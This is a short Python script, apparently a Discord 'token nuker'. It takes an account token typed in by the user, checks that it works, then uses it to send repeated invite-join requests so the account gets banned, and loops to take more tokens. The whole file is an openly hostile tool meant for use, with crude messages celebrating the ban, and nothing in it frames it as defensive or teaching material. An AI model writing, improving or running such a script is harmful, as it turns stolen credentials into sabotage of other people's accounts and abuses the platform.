try:
    import requests
    import os
except ModuleNotFoundError as e:
    modulename = str(e).split("No module named ")[1].replace("'", "")
    input(f"Please install module with: pip install {modulename}")
    exit()


def main():
    os.system("cls")
    token = input("TOKEN TO FUCK: ")

    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }

    body = requests.get(
        'https://discordapp.com/api/v9/users/@me', headers=headers)

    if body.status_code == 200:
        print("Fucking the token, Please wait.")
        for x in range(30):
            r = requests.post(
                "https://discordapp.com/api/v6/invite/r3sSKJJ", headers=headers)
            if r.status_code != 200:
                break
        print("Token was Fucked and Banned !")
    else:
        print("Invalid token")

    os.system("pause")
    main()


main()
